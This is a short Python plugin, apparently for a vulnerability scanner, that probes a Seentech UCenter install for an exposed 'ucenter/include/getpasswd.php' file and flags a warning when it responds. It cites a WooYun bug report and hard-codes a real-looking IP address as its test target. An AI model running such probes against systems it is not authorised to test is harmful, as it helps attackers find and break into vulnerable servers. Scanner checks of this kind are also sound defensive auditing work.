#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2010-0123359

def assign(service, arg):
    if service == 'seentech_uccenter':
        return True, arg
        
def audit(arg):
    payload = "ucenter/include/getpasswd.php"
    code,_,res,_,_ = curl.curl2(arg+payload)
    if len(res)>0 and code ==200:
        security_warning(arg+payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'https://60.223.226.154/')[1])